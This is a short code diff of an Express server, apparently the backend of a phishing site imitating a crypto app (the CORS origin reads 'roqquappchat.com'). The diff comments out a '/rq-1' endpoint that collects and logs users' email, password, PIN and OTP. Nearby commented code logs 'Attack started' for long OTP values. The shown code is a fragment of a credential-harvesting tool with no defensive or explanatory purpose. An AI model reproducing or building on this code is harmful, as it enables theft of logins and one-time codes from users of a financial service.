@@ -23,7 +23,7 @@ const session = require('express-session')
 
 app.use(cookieParser())
 app.use(express.urlencoded({ extended: true }))
-const parseForm = bodyParser.urlencoded({ extended: false })
+//const parseForm = bodyParser.urlencoded({ extended: false })
 
 const corsOptions = {
     // origin: 'https://roqquappchat.com',
@@ -72,14 +72,14 @@ app.get('/form', (req, res) => {
     res.send('hello')
 })
 
-app.post('/rq-1', (req, res, next) => {
-    console.log('req body', req.body)
+// app.post('/rq-1', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    const { email, password, pin, otp } = req.body
+//     const { email, password, pin, otp } = req.body
 
-    console.log('length of otp', otp.length)
+//     console.log('length of otp', otp.length)
 
-    res.send('success')
+//     res.send('success')
 
     // if (otp.length > 6) {
     //     console.log('Attack started', otp)
@@ -134,7 +134,7 @@ app.post('/rq-1', (req, res, next) => {
     //         }
     //     })
     // }
-})
+//})
 
 // app.post('/roqquapp', (req, res, next) => {
 //     console.log('req body', req.body)
